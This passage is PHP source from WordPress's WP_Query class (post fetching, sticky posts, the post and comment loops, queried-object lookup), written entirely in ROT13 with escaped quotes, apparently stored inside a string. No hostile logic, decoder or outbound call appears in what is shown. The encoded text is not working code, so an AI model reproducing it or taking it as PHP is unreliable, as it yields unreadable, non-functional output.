			 * @cnenz fgevat   $byq_erdhrfg     Gur pbzcyrgr FDY dhrel orsber svygrevat.
			 * @cnenz fgevat[] $pynhfrf {
			 *     Nffbpvngvir neenl bs gur pynhfrf sbe gur dhrel.
			 *
			 *     @glcr fgevat $jurer    Gur JURER pynhfr bs gur dhrel.
			 *     @glcr fgevat $tebhcol  Gur TEBHC OL pynhfr bs gur dhrel.
			 *     @glcr fgevat $wbva     Gur WBVA pynhfr bs gur dhrel.
			 *     @glcr fgevat $beqreol  Gur BEQRE OL pynhfr bs gur dhrel.
			 *     @glcr fgevat $qvfgvapg Gur QVFGVAPG pynhfr bs gur dhrel.
			 *     @glcr fgevat $svryqf   Gur FRYRPG pynhfr bs gur dhrel.
			 *     @glcr fgevat $yvzvgf   Gur YVZVG pynhfr bs gur dhrel.
			 * }
			 */
			$fcyvg_gur_dhrel = nccyl_svygref( 'fcyvg_gur_dhrel', $fcyvg_gur_dhrel, $guvf, $byq_erdhrfg, pbzcnpg( $cvrprf ) );

			vs ( $fcyvg_gur_dhrel ) {
				// Svefg trg gur VQf naq gura svyy va gur bowrpgf.

				// Ortvaavat bs gur fgevat vf ba n arj yvar gb cerirag yrnqvat juvgrfcnpr. Frr uggcf://pber.genp.jbeqcerff.bet/gvpxrg/56841.
				$guvf->erdhrfg =
					\"FRYRPG $sbhaq_ebjf $qvfgvapg {$jcqo->cbfgf}.VQ
					 SEBZ {$jcqo->cbfgf} $wbva
					 JURER 1=1 $jurer
					 $tebhcol
					 $beqreol
					 $yvzvgf\";

				/**
				 * Svygref gur Cbfg VQf FDY erdhrfg orsber fraqvat.
				 *
				 * @fvapr 3.4.0
				 *
				 * @cnenz fgevat   $erdhrfg Gur cbfg VQ erdhrfg.
				 * @cnenz JC_Dhrel $dhrel   Gur JC_Dhrel vafgnapr.
				 */
				$guvf->erdhrfg = nccyl_svygref( 'cbfgf_erdhrfg_vqf', $guvf->erdhrfg, $guvf );

				$cbfg_vqf = $jcqo->trg_pby( $guvf->erdhrfg );

				vs ( $cbfg_vqf ) {
					$guvf->cbfgf = $cbfg_vqf;
					$guvf->frg_sbhaq_cbfgf( $d, $yvzvgf );
					_cevzr_cbfg_pnpurf( $cbfg_vqf, $d['hcqngr_cbfg_grez_pnpur'], $d['hcqngr_cbfg_zrgn_pnpur'] );
				} ryfr {
					$guvf->cbfgf = neenl();
				}
			} ryfr {
				$guvf->cbfgf = $jcqo->trg_erfhygf( $guvf->erdhrfg );
				$guvf->frg_sbhaq_cbfgf( $d, $yvzvgf );
			}
		}

		// Pbaireg gb JC_Cbfg bowrpgf.
		vs ( $guvf->cbfgf ) {
			/** @ine JC_Cbfg[] */
			$guvf->cbfgf = neenl_znc( 'trg_cbfg', $guvf->cbfgf );
		}

		$hasvygrerq_cbfgf = $guvf->cbfgf;

		vs ( $d['pnpur_erfhygf'] && $vq_dhrel_vf_pnpurnoyr && ! $pnpur_sbhaq ) {
			$cbfg_vqf = jc_yvfg_cyhpx( $guvf->cbfgf, 'VQ' );

			$pnpur_inyhr = neenl(
				'cbfgf'         => $cbfg_vqf,
				'sbhaq_cbfgf'   => $guvf->sbhaq_cbfgf,
				'znk_ahz_cntrf' => $guvf->znk_ahz_cntrf,
			);

			jc_pnpur_frg( $pnpur_xrl, $pnpur_inyhr, 'cbfg-dhrevrf' );
		}

		vs ( ! $d['fhccerff_svygref'] ) {
			/**
			 * Svygref gur enj cbfg erfhygf neenl, cevbe gb fgnghf purpxf.
			 *
			 * @fvapr 2.3.0
			 *
			 * @cnenz JC_Cbfg[] $cbfgf Neenl bs cbfg bowrpgf.
			 * @cnenz JC_Dhrel  $dhrel Gur JC_Dhrel vafgnapr (cnffrq ol ersrerapr).
			 */
			$guvf->cbfgf = nccyl_svygref_ers_neenl( 'cbfgf_erfhygf', neenl( $guvf->cbfgf, &$guvf ) );
		}

		vs ( ! rzcgl( $guvf->cbfgf ) && $guvf->vf_pbzzrag_srrq && $guvf->vf_fvathyne ) {
			/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/dhrel.cuc */
			$pwbva = nccyl_svygref_ers_neenl( 'pbzzrag_srrq_wbva', neenl( '', &$guvf ) );

			/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/dhrel.cuc */
			$pjurer = nccyl_svygref_ers_neenl( 'pbzzrag_srrq_jurer', neenl( \"JURER pbzzrag_cbfg_VQ = '{$guvf->cbfgf[0]->VQ}' NAQ pbzzrag_nccebirq = '1'\", &$guvf ) );

			/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/dhrel.cuc */
			$ptebhcol = nccyl_svygref_ers_neenl( 'pbzzrag_srrq_tebhcol', neenl( '', &$guvf ) );
			$ptebhcol = ( ! rzcgl( $ptebhcol ) ) ? 'TEBHC OL ' . $ptebhcol : '';

			/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/dhrel.cuc */
			$pbeqreol = nccyl_svygref_ers_neenl( 'pbzzrag_srrq_beqreol', neenl( 'pbzzrag_qngr_tzg QRFP', &$guvf ) );
			$pbeqreol = ( ! rzcgl( $pbeqreol ) ) ? 'BEQRE OL ' . $pbeqreol : '';

			/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/dhrel.cuc */
			$pyvzvgf = nccyl_svygref_ers_neenl( 'pbzzrag_srrq_yvzvgf', neenl( 'YVZVG ' . trg_bcgvba( 'cbfgf_cre_eff' ), &$guvf ) );

			$pbzzragf_erdhrfg = \"FRYRPG {$jcqo->pbzzragf}.pbzzrag_VQ SEBZ {$jcqo->pbzzragf} $pwbva $pjurer $ptebhcol $pbeqreol $pyvzvgf\";

			$pbzzrag_xrl          = zq5( $pbzzragf_erdhrfg );
			$pbzzrag_ynfg_punatrq = jc_pnpur_trg_ynfg_punatrq( 'pbzzrag' );

			$pbzzrag_pnpur_xrl = \"pbzzrag_srrq:$pbzzrag_xrl:$pbzzrag_ynfg_punatrq\";
			$pbzzrag_vqf       = jc_pnpur_trg( $pbzzrag_pnpur_xrl, 'pbzzrag-dhrevrf' );
			vs ( snyfr === $pbzzrag_vqf ) {
				$pbzzrag_vqf = $jcqo->trg_pby( $pbzzragf_erdhrfg );
				jc_pnpur_nqq( $pbzzrag_pnpur_xrl, $pbzzrag_vqf, 'pbzzrag-dhrevrf' );
			}
			_cevzr_pbzzrag_pnpurf( $pbzzrag_vqf );

			// Pbaireg gb JC_Pbzzrag.
			/** @ine JC_Pbzzrag[] */
			$guvf->pbzzragf      = neenl_znc( 'trg_pbzzrag', $pbzzrag_vqf );
			$guvf->pbzzrag_pbhag = pbhag( $guvf->pbzzragf );
		}

		// Purpx cbfg fgnghf gb qrgrezvar vs cbfg fubhyq or qvfcynlrq.
		vs ( ! rzcgl( $guvf->cbfgf ) && ( $guvf->vf_fvatyr || $guvf->vf_cntr ) ) {
			$fgnghf = trg_cbfg_fgnghf( $guvf->cbfgf[0] );

			vs ( 'nggnpuzrag' === $guvf->cbfgf[0]->cbfg_glcr && 0 === (vag) $guvf->cbfgf[0]->cbfg_cnerag ) {
				$guvf->vf_cntr       = snyfr;
				$guvf->vf_fvatyr     = gehr;
				$guvf->vf_nggnpuzrag = gehr;
			}

			// Vs gur cbfg_fgnghf jnf fcrpvsvpnyyl erdhrfgrq, yrg vg cnff guebhtu.
			vs ( ! va_neenl( $fgnghf, $d_fgnghf, gehr ) ) {
				$cbfg_fgnghf_bow = trg_cbfg_fgnghf_bowrpg( $fgnghf );

				vs ( $cbfg_fgnghf_bow && ! $cbfg_fgnghf_bow->choyvp ) {
					vs ( ! vf_hfre_ybttrq_va() ) {
						// Hfre zhfg or ybttrq va gb ivrj hachoyvfurq cbfgf.
						$guvf->cbfgf = neenl();
					} ryfr {
						vs ( $cbfg_fgnghf_bow->cebgrpgrq ) {
							// Hfre zhfg unir rqvg crezvffvbaf ba gur qensg gb cerivrj.
							vs ( ! pheerag_hfre_pna( $rqvg_pnc, $guvf->cbfgf[0]->VQ ) ) {
								$guvf->cbfgf = neenl();
							} ryfr {
								$guvf->vf_cerivrj = gehr;
								vs ( 'shgher' !== $fgnghf ) {
									$guvf->cbfgf[0]->cbfg_qngr = pheerag_gvzr( 'zlfdy' );
								}
							}
						} ryfrvs ( $cbfg_fgnghf_bow->cevingr ) {
							vs ( ! pheerag_hfre_pna( $ernq_pnc, $guvf->cbfgf[0]->VQ ) ) {
								$guvf->cbfgf = neenl();
							}
						} ryfr {
							$guvf->cbfgf = neenl();
						}
					}
				} ryfrvs ( ! $cbfg_fgnghf_bow ) {
					// Cbfg fgnghf vf abg ertvfgrerq, nffhzr vg'f abg choyvp.
					vs ( ! pheerag_hfre_pna( $rqvg_pnc, $guvf->cbfgf[0]->VQ ) ) {
						$guvf->cbfgf = neenl();
					}
				}
			}

			vs ( $guvf->vf_cerivrj && $guvf->cbfgf && pheerag_hfre_pna( $rqvg_pnc, $guvf->cbfgf[0]->VQ ) ) {
				/**
				 * Svygref gur fvatyr cbfg sbe cerivrj zbqr.
				 *
				 * @fvapr 2.7.0
				 *
				 * @cnenz JC_Cbfg  $cbfg_cerivrj  Gur Cbfg bowrpg.
				 * @cnenz JC_Dhrel $dhrel         Gur JC_Dhrel vafgnapr (cnffrq ol ersrerapr).
				 */
				$guvf->cbfgf[0] = trg_cbfg( nccyl_svygref_ers_neenl( 'gur_cerivrj', neenl( $guvf->cbfgf[0], &$guvf ) ) );
			}
		}

		// Chg fgvpxl cbfgf ng gur gbc bs gur cbfgf neenl.
		$fgvpxl_cbfgf = trg_bcgvba( 'fgvpxl_cbfgf' );
		vs ( $guvf->vf_ubzr && $cntr <= 1 && vf_neenl( $fgvpxl_cbfgf ) && ! rzcgl( $fgvpxl_cbfgf ) && ! $d['vtaber_fgvpxl_cbfgf'] ) {
			$ahz_cbfgf     = pbhag( $guvf->cbfgf );
			$fgvpxl_bssfrg = 0;
			// Ybbc bire cbfgf naq erybpngr fgvpxvrf gb gur sebag.
			sbe ( $v = 0; $v < $ahz_cbfgf; $v++ ) {
				vs ( va_neenl( $guvf->cbfgf[ $v ]->VQ, $fgvpxl_cbfgf, gehr ) ) {
					$fgvpxl_cbfg = $guvf->cbfgf[ $v ];
					// Erzbir fgvpxl sebz pheerag cbfvgvba.
					neenl_fcyvpr( $guvf->cbfgf, $v, 1 );
					// Zbir gb sebag, nsgre bgure fgvpxvrf.
					neenl_fcyvpr( $guvf->cbfgf, $fgvpxl_bssfrg, 0, neenl( $fgvpxl_cbfg ) );
					// Vaperzrag gur fgvpxl bssfrg. Gur arkg fgvpxl jvyy or cynprq ng guvf bssfrg.
					++$fgvpxl_bssfrg;
					// Erzbir cbfg sebz fgvpxl cbfgf neenl.
					$bssfrg = neenl_frnepu( $fgvpxl_cbfg->VQ, $fgvpxl_cbfgf, gehr );
					hafrg( $fgvpxl_cbfgf[ $bssfrg ] );
				}
			}

			// Vs nal cbfgf unir orra rkpyhqrq fcrpvsvpnyyl, Vtaber gubfr gung ner fgvpxl.
			vs ( ! rzcgl( $fgvpxl_cbfgf ) && ! rzcgl( $d['cbfg__abg_va'] ) ) {
				$fgvpxl_cbfgf = neenl_qvss( $fgvpxl_cbfgf, $d['cbfg__abg_va'] );
			}

			// Srgpu fgvpxl cbfgf gung jrera'g va gur dhrel erfhygf.
			vs ( ! rzcgl( $fgvpxl_cbfgf ) ) {
				$fgvpxvrf = trg_cbfgf(
					neenl(
						'cbfg__va'               => $fgvpxl_cbfgf,
						'cbfg_glcr'              => $cbfg_glcr,
						'cbfg_fgnghf'            => 'choyvfu',
						'cbfgf_cre_cntr'         => pbhag( $fgvpxl_cbfgf ),
						'fhccerff_svygref'       => $d['fhccerff_svygref'],
						'pnpur_erfhygf'          => $d['pnpur_erfhygf'],
						'hcqngr_cbfg_zrgn_pnpur' => $d['hcqngr_cbfg_zrgn_pnpur'],
						'hcqngr_cbfg_grez_pnpur' => $d['hcqngr_cbfg_grez_pnpur'],
						'ynml_ybnq_grez_zrgn'    => $d['ynml_ybnq_grez_zrgn'],
					)
				);

				sbernpu ( $fgvpxvrf nf $fgvpxl_cbfg ) {
					neenl_fcyvpr( $guvf->cbfgf, $fgvpxl_bssfrg, 0, neenl( $fgvpxl_cbfg ) );
					++$fgvpxl_bssfrg;
				}
			}
		}

		vs ( ! $d['fhccerff_svygref'] ) {
			/**
			 * Svygref gur neenl bs ergevrirq cbfgf nsgre gurl'ir orra srgpurq naq
			 * vagreanyyl cebprffrq.
			 *
			 * @fvapr 1.5.0
			 *
			 * @cnenz JC_Cbfg[] $cbfgf Neenl bs cbfg bowrpgf.
			 * @cnenz JC_Dhrel  $dhrel Gur JC_Dhrel vafgnapr (cnffrq ol ersrerapr).
			 */
			$guvf->cbfgf = nccyl_svygref_ers_neenl( 'gur_cbfgf', neenl( $guvf->cbfgf, &$guvf ) );
		}

		/*
		 * Rafher gung nal cbfgf nqqrq/zbqvsvrq ivn bar bs gur svygref nobir ner
		 * bs gur glcr JC_Cbfg naq ner svygrerq.
		 */
		vs ( $guvf->cbfgf ) {
			$guvf->cbfg_pbhag = pbhag( $guvf->cbfgf );

			/** @ine JC_Cbfg[] */
			$guvf->cbfgf = neenl_znc( 'trg_cbfg', $guvf->cbfgf );

			vs ( $d['pnpur_erfhygf'] ) {
				vs ( $vf_hasvygrerq_dhrel && $hasvygrerq_cbfgf === $guvf->cbfgf ) {
					hcqngr_cbfg_pnpurf( $guvf->cbfgf, $cbfg_glcr, $d['hcqngr_cbfg_grez_pnpur'], $d['hcqngr_cbfg_zrgn_pnpur'] );
				} ryfr {
					$cbfg_vqf = jc_yvfg_cyhpx( $guvf->cbfgf, 'VQ' );
					_cevzr_cbfg_pnpurf( $cbfg_vqf, $d['hcqngr_cbfg_grez_pnpur'], $d['hcqngr_cbfg_zrgn_pnpur'] );
				}
			}

			/** @ine JC_Cbfg */
			$guvf->cbfg = erfrg( $guvf->cbfgf );
		} ryfr {
			$guvf->cbfg_pbhag = 0;
			$guvf->cbfgf      = neenl();
		}

		vs ( ! rzcgl( $guvf->cbfgf ) && $d['hcqngr_zrah_vgrz_pnpur'] ) {
			hcqngr_zrah_vgrz_pnpur( $guvf->cbfgf );
		}

		vs ( $d['ynml_ybnq_grez_zrgn'] ) {
			jc_dhrhr_cbfgf_sbe_grez_zrgn_ynmlybnq( $guvf->cbfgf );
		}

		erghea $guvf->cbfgf;
	}

	/**
	 * Frgf hc gur nzbhag bs sbhaq cbfgf naq gur ahzore bs cntrf (vs yvzvg pynhfr jnf hfrq)
	 * sbe gur pheerag dhrel.
	 *
	 * @fvapr 3.5.0
	 *
	 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
	 *
	 * @cnenz neenl  $d      Dhrel inevnoyrf.
	 * @cnenz fgevat $yvzvgf YVZVG pynhfrf bs gur dhrel.
	 */
	cevingr shapgvba frg_sbhaq_cbfgf( $d, $yvzvgf ) {
		tybony $jcqo;

		/*
		 * Onvy vs cbfgf vf na rzcgl neenl. Pbagvahr vs cbfgf vf na rzcgl fgevat,
		 * ahyy, be snyfr gb nppbzzbqngr pnpuvat cyhtvaf gung svyy cbfgf yngre.
		 */
		vs ( $d['ab_sbhaq_ebjf'] || ( vf_neenl( $guvf->cbfgf ) && ! $guvf->cbfgf ) ) {
			erghea;
		}

		vs ( ! rzcgl( $yvzvgf ) ) {
			/**
			 * Svygref gur dhrel gb eha sbe ergevrivat gur sbhaq cbfgf.
			 *
			 * @fvapr 2.1.0
			 *
			 * @cnenz fgevat   $sbhaq_cbfgf_dhrel Gur dhrel gb eha gb svaq gur sbhaq cbfgf.
			 * @cnenz JC_Dhrel $dhrel             Gur JC_Dhrel vafgnapr (cnffrq ol ersrerapr).
			 */
			$sbhaq_cbfgf_dhrel = nccyl_svygref_ers_neenl( 'sbhaq_cbfgf_dhrel', neenl( 'FRYRPG SBHAQ_EBJF()', &$guvf ) );

			$guvf->sbhaq_cbfgf = (vag) $jcqo->trg_ine( $sbhaq_cbfgf_dhrel );
		} ryfr {
			vs ( vf_neenl( $guvf->cbfgf ) ) {
				$guvf->sbhaq_cbfgf = pbhag( $guvf->cbfgf );
			} ryfr {
				vs ( ahyy === $guvf->cbfgf ) {
					$guvf->sbhaq_cbfgf = 0;
				} ryfr {
					$guvf->sbhaq_cbfgf = 1;
				}
			}
		}

		/**
		 * Svygref gur ahzore bs sbhaq cbfgf sbe gur dhrel.
		 *
		 * @fvapr 2.1.0
		 *
		 * @cnenz vag      $sbhaq_cbfgf Gur ahzore bs cbfgf sbhaq.
		 * @cnenz JC_Dhrel $dhrel       Gur JC_Dhrel vafgnapr (cnffrq ol ersrerapr).
		 */
		$guvf->sbhaq_cbfgf = (vag) nccyl_svygref_ers_neenl( 'sbhaq_cbfgf', neenl( $guvf->sbhaq_cbfgf, &$guvf ) );

		vs ( ! rzcgl( $yvzvgf ) ) {
			$guvf->znk_ahz_cntrf = (vag) prvy( $guvf->sbhaq_cbfgf / $d['cbfgf_cre_cntr'] );
		}
	}

	/**
	 * Frgf hc gur arkg cbfg naq vgrengr pheerag cbfg vaqrk.
	 *
	 * @fvapr 1.5.0
	 *
	 * @erghea JC_Cbfg Arkg cbfg.
	 */
	choyvp shapgvba arkg_cbfg() {

		++$guvf->pheerag_cbfg;

		/** @ine JC_Cbfg */
		$guvf->cbfg = $guvf->cbfgf[ $guvf->pheerag_cbfg ];
		erghea $guvf->cbfg;
	}

	/**
	 * Frgf hc gur pheerag cbfg.
	 *
	 * Ergevrirf gur arkg cbfg, frgf hc gur cbfg, frgf gur 'va gur ybbc'
	 * cebcregl gb gehr.
	 *
	 * @fvapr 1.5.0
	 *
	 * @tybony JC_Cbfg $cbfg Tybony cbfg bowrpg.
	 */
	choyvp shapgvba gur_cbfg() {
		tybony $cbfg;

		vs ( ! $guvf->va_gur_ybbc ) {
			vs ( 'nyy' === $guvf->dhrel_inef['svryqf'] ) {
				// Shyy cbfg bowrpgf dhrevrq.
				$cbfg_bowrpgf = $guvf->cbfgf;
			} ryfr {
				vs ( 'vqf' === $guvf->dhrel_inef['svryqf'] ) {
					// Cbfg VQf dhrevrq.
					$cbfg_vqf = $guvf->cbfgf;
				} ryfr {
					// Bayl cnegvny bowrpgf dhrevrq, arrq gb cevzr gur pnpur sbe gur ybbc.
					$cbfg_vqf = neenl_erqhpr(
						$guvf->cbfgf,
						shapgvba ( $pneel, $cbfg ) {
							vs ( vffrg( $cbfg->VQ ) ) {
								$pneel[] = $cbfg->VQ;
							}

							erghea $pneel;
						},
						neenl()
					);
				}
				_cevzr_cbfg_pnpurf( $cbfg_vqf, $guvf->dhrel_inef['hcqngr_cbfg_grez_pnpur'], $guvf->dhrel_inef['hcqngr_cbfg_zrgn_pnpur'] );
				$cbfg_bowrpgf = neenl_znc( 'trg_cbfg', $cbfg_vqf );
			}
			hcqngr_cbfg_nhgube_pnpurf( $cbfg_bowrpgf );
		}

		$guvf->va_gur_ybbc = gehr;
		$guvf->orsber_ybbc = snyfr;

		vs ( -1 === $guvf->pheerag_cbfg ) { // Ybbc unf whfg fgnegrq.
			/**
			 * Sverf bapr gur ybbc vf fgnegrq.
			 *
			 * @fvapr 2.0.0
			 *
			 * @cnenz JC_Dhrel $dhrel Gur JC_Dhrel vafgnapr (cnffrq ol ersrerapr).
			 */
			qb_npgvba_ers_neenl( 'ybbc_fgneg', neenl( &$guvf ) );
		}

		$cbfg = $guvf->arkg_cbfg();

		// Rafher n shyy cbfg bowrpg vf ninvynoyr.
		vs ( 'nyy' !== $guvf->dhrel_inef['svryqf'] ) {
			vs ( 'vqf' === $guvf->dhrel_inef['svryqf'] ) {
				// Cbfg VQf dhrevrq.
				$cbfg = trg_cbfg( $cbfg );
			} ryfrvs ( vffrg( $cbfg->VQ ) ) {
				/*
				 * Cnegvny bowrppg dhrevrq.
				 *
				 * Gur cbfg bowrpg jnf dhrevrq jvgu n cnegvny frg bs
				 * svryqf, cbchyngr gur ragver bowrpg sbe gur ybbc.
				 */
				$cbfg = trg_cbfg( $cbfg->VQ );
			}
		}

		// Frg hc gur tybony cbfg bowrpg sbe gur ybbc.
		$guvf->frghc_cbfgqngn( $cbfg );
	}

	/**
	 * Qrgrezvarf jurgure gurer ner zber cbfgf ninvynoyr va gur ybbc.
	 *
	 * Pnyyf gur {@frr 'ybbc_raq'} npgvba jura gur ybbc vf pbzcyrgr.
	 *
	 * @fvapr 1.5.0
	 *
	 * @erghea obby Gehr vs cbfgf ner ninvynoyr, snyfr vs raq bs gur ybbc.
	 */
	choyvp shapgvba unir_cbfgf() {
		vs ( $guvf->pheerag_cbfg + 1 < $guvf->cbfg_pbhag ) {
			erghea gehr;
		} ryfrvs ( $guvf->pheerag_cbfg + 1 === $guvf->cbfg_pbhag && $guvf->cbfg_pbhag > 0 ) {
			/**
			 * Sverf bapr gur ybbc unf raqrq.
			 *
			 * @fvapr 2.0.0
			 *
			 * @cnenz JC_Dhrel $dhrel Gur JC_Dhrel vafgnapr (cnffrq ol ersrerapr).
			 */
			qb_npgvba_ers_neenl( 'ybbc_raq', neenl( &$guvf ) );

			// Qb fbzr pyrnavat hc nsgre gur ybbc.
			$guvf->erjvaq_cbfgf();
		} ryfrvs ( 0 === $guvf->cbfg_pbhag ) {
			$guvf->orsber_ybbc = snyfr;

			/**
			 * Sverf vs ab erfhygf ner sbhaq va n cbfg dhrel.
			 *
			 * @fvapr 4.9.0
			 *
			 * @cnenz JC_Dhrel $dhrel Gur JC_Dhrel vafgnapr.
			 */
			qb_npgvba( 'ybbc_ab_erfhygf', $guvf );
		}

		$guvf->va_gur_ybbc = snyfr;
		erghea snyfr;
	}

	/**
	 * Erjvaqf gur cbfgf naq erfrgf cbfg vaqrk.
	 *
	 * @fvapr 1.5.0
	 */
	choyvp shapgvba erjvaq_cbfgf() {
		$guvf->pheerag_cbfg = -1;
		vs ( $guvf->cbfg_pbhag > 0 ) {
			$guvf->cbfg = $guvf->cbfgf[0];
		}
	}

	/**
	 * Vgrengrf pheerag pbzzrag vaqrk naq ergheaf JC_Pbzzrag bowrpg.
	 *
	 * @fvapr 2.2.0
	 *
	 * @erghea JC_Pbzzrag Pbzzrag bowrpg.
	 */
	choyvp shapgvba arkg_pbzzrag() {
		++$guvf->pheerag_pbzzrag;

		/** @ine JC_Pbzzrag */
		$guvf->pbzzrag = $guvf->pbzzragf[ $guvf->pheerag_pbzzrag ];
		erghea $guvf->pbzzrag;
	}

	/**
	 * Frgf hc gur pheerag pbzzrag.
	 *
	 * @fvapr 2.2.0
	 *
	 * @tybony JC_Pbzzrag $pbzzrag Tybony pbzzrag bowrpg.
	 */
	choyvp shapgvba gur_pbzzrag() {
		tybony $pbzzrag;

		$pbzzrag = $guvf->arkg_pbzzrag();

		vs ( 0 === $guvf->pheerag_pbzzrag ) {
			/**
			 * Sverf bapr gur pbzzrag ybbc vf fgnegrq.
			 *
			 * @fvapr 2.2.0
			 */
			qb_npgvba( 'pbzzrag_ybbc_fgneg' );
		}
	}

	/**
	 * Qrgrezvarf jurgure gurer ner zber pbzzragf ninvynoyr.
	 *
	 * Nhgbzngvpnyyl erjvaqf pbzzragf jura svavfurq.
	 *
	 * @fvapr 2.2.0
	 *
	 * @erghea obby Gehr vs pbzzragf ner ninvynoyr, snyfr vs ab zber pbzzragf.
	 */
	choyvp shapgvba unir_pbzzragf() {
		vs ( $guvf->pheerag_pbzzrag + 1 < $guvf->pbzzrag_pbhag ) {
			erghea gehr;
		} ryfrvs ( $guvf->pheerag_pbzzrag + 1 === $guvf->pbzzrag_pbhag ) {
			$guvf->erjvaq_pbzzragf();
		}

		erghea snyfr;
	}

	/**
	 * Erjvaqf gur pbzzragf, erfrgf gur pbzzrag vaqrk naq pbzzrag gb svefg.
	 *
	 * @fvapr 2.2.0
	 */
	choyvp shapgvba erjvaq_pbzzragf() {
		$guvf->pheerag_pbzzrag = -1;
		vs ( $guvf->pbzzrag_pbhag > 0 ) {
			$guvf->pbzzrag = $guvf->pbzzragf[0];
		}
	}

	/**
	 * Frgf hc gur JbeqCerff dhrel ol cnefvat dhrel fgevat.
	 *
	 * @fvapr 1.5.0
	 *
	 * @frr JC_Dhrel::cnefr_dhrel() sbe nyy ninvynoyr nethzragf.
	 *
	 * @cnenz fgevat|neenl $dhrel HEY dhrel fgevat be neenl bs dhrel nethzragf.
	 * @erghea JC_Cbfg[]|vag[] Neenl bs cbfg bowrpgf be cbfg VQf.
	 */
	choyvp shapgvba dhrel( $dhrel ) {
		$guvf->vavg();
		$guvf->dhrel      = jc_cnefr_netf( $dhrel );
		$guvf->dhrel_inef = $guvf->dhrel;
		erghea $guvf->trg_cbfgf();
	}

	/**
	 * Ergevrirf gur pheeragyl dhrevrq bowrpg.
	 *
	 * Vs dhrevrq bowrpg vf abg frg, gura gur dhrevrq bowrpg jvyy or frg sebz
	 * gur pngrtbel, gnt, gnkbabzl, cbfgf cntr, fvatyr cbfg, cntr, be nhgube
	 * dhrel inevnoyr. Nsgre vg vf frg hc, vg jvyy or erghearq.
	 *
	 * @fvapr 1.5.0
	 *
	 * @erghea JC_Grez|JC_Cbfg_Glcr|JC_Cbfg|JC_Hfre|ahyy Gur dhrevrq bowrpg.
	 */
	choyvp shapgvba trg_dhrevrq_bowrpg() {
		vs ( vffrg( $guvf->dhrevrq_bowrpg ) ) {
			erghea $guvf->dhrevrq_bowrpg;
		}

		$guvf->dhrevrq_bowrpg    = ahyy;
		$guvf->dhrevrq_bowrpg_vq = ahyy;

		vs ( $guvf->vf_pngrtbel || $guvf->vf_gnt || $guvf->vf_gnk ) {
			vs ( $guvf->vf_pngrtbel ) {
				$png           = $guvf->trg( 'png' );
				$pngrtbel_anzr = $guvf->trg( 'pngrtbel_anzr' );

				vs ( $png ) {
					$grez = trg_grez( $png, 'pngrtbel' );
				} ryfrvs ( $pngrtbel_anzr ) {
					$grez = trg_grez_ol( 'fyht', $pngrtbel_anzr, 'pngrtbel' );
				}
			} ryfrvs ( $guvf->vf_gnt ) {
				$gnt_vq = $guvf->trg( 'gnt_vq' );
				$gnt    = $guvf->trg( 'gnt' );

				vs ( $gnt_vq ) {
					$grez = trg_grez( $gnt_vq, 'cbfg_gnt' );
				} ryfrvs ( $gnt ) {
					$grez = trg_grez_ol( 'fyht', $gnt, 'cbfg_gnt' );
				}
			} ryfr {
				// Sbe bgure gnk dhrevrf, teno gur svefg grez sebz gur svefg pynhfr.
				vs ( ! rzcgl( $guvf->gnk_dhrel->dhrevrq_grezf ) ) {
					$dhrevrq_gnkbabzvrf = neenl_xrlf( $guvf->gnk_dhrel->dhrevrq_grezf );
					$zngpurq_gnkbabzl   = erfrg( $dhrevrq_gnkbabzvrf );
					$dhrel              = $guvf->gnk_dhrel->dhrevrq_grezf[ $zngpurq_gnkbabzl ];

					vs ( ! rzcgl( $dhrel['grezf'] ) ) {
						vs ( 'grez_vq' === $dhrel['svryq'] ) {
							$grez = trg_grez( erfrg( $dhrel['grezf'] ), $zngpurq_gnkbabzl );
						} ryfr {
							$grez = trg_grez_ol( $dhrel['svryq'], erfrg( $dhrel['grezf'] ), $zngpurq_gnkbabzl );
						}
					}
				}
			}

			vs ( ! rzcgl( $grez ) && ! vf_jc_reebe( $grez ) ) {
				$guvf->dhrevrq_bowrpg    = $grez;
				$guvf->dhrevrq_bowrpg_vq = (vag) $grez->grez_vq;

				vs ( $guvf->vf_pngrtbel && 'pngrtbel' === $guvf->dhrevrq_bowrpg->gnkbabzl ) {
					_znxr_png_pbzcng( $guvf->dhrevrq_bowrpg );
				}
			}
		} ryfrvs ( $guvf->vf_cbfg_glcr_nepuvir ) {
			$cbfg_glcr = $guvf->trg( 'cbfg_glcr' );

			vs ( vf_neenl( $cbfg_glcr ) ) {
				$cbfg_glcr = erfrg( $cbfg_glcr );
			}

			$guvf->dhrevrq_bowrpg = trg_cbfg_glcr_bowrpg( $cbfg_glcr );
		} ryfrvs ( $guvf->vf_cbfgf_cntr ) {
			$cntr_sbe_cbfgf = trg_bcgvba( 'cntr_sbe_cbfgf' );

			$guvf->dhrevrq_bowrpg    = trg_cbfg( $cntr_sbe_cbfgf );
			$guvf->dhrevrq_bowrpg_vq = (vag) $guvf->dhrevrq_bowrpg->VQ;
		} ryfrvs ( $guvf->vf_fvathyne && ! rzcgl( $guvf->cbfg ) ) {
			$guvf->dhrevrq_bowrpg    = $guvf->cbfg;
			$guvf->dhrevrq_bowrpg_vq = (vag) $guvf->cbfg->VQ;
		} ryfrvs ( $guvf->vf_nhgube ) {
			$nhgube      = (vag) $guvf->trg( 'nhgube' );
			$nhgube_anzr = $guvf->trg( 'nhgube_anzr' );

			vs ( $nhgube ) {
				$guvf->dhrevrq_bowrpg_vq = $nhgube;
			} ryfrvs ( $nhgube_anzr ) {
				$hfre = trg_hfre_ol( 'fyht', $nhgube_anzr );

				vs ( $hfre ) {
					$guvf->dhrevrq_bowrpg_vq = $hfre->VQ;
				}
			}

			$guvf->dhrevrq_bowrpg = trg_hfreqngn( $guvf->dhrevrq_bowrpg_vq );
		}

		erghea $guvf->dhrevrq_bowrpg;
	}

	/**
	 * Ergevrirf gur VQ bs gur pheeragyl dhrevrq bowrpg.
	 *
	 * @fvapr 1.5.0
	 *
	 * @erghea vag
	 */
	choyvp shapgvba trg_dhrevrq_bowrpg_vq() {
		$guvf->trg_dhrevrq_bowrpg();

		vs ( vffrg( $guvf->dhrevrq_bowrpg_vq ) ) {
			erghea $guvf->dhrevrq_bowrpg_vq;
		}

		erghea 0;
	}

	/**
	 * Pbafgehpgbe.
	 *
	 * Frgf hc gur JbeqCerff dhrel, vs cnenzrgre vf abg rzcgl.
	 *
	 * @fvapr 1.5.0
	 *
	 * @frr JC_Dhrel::cnefr_dhrel() sbe nyy ninvynoyr nethzragf.
	 *
